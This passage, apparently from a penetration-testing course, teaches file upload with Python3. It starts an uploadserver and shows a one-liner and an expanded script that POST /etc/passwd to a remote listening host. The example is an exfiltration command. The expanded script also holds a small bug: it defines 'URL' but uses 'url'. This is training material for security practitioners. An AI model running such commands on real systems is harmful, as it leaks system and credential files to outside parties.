## Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).

#### Starting the Python uploadserver Module

Starting the Python uploadserver Module

```shell-session
glack@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Uploading a File Using a Python One-liner

Uploading a File Using a Python One-liner

```shell-session
glack@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Let's divide this one-liner into multiple lines to understand each piece better.

Code: python

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.
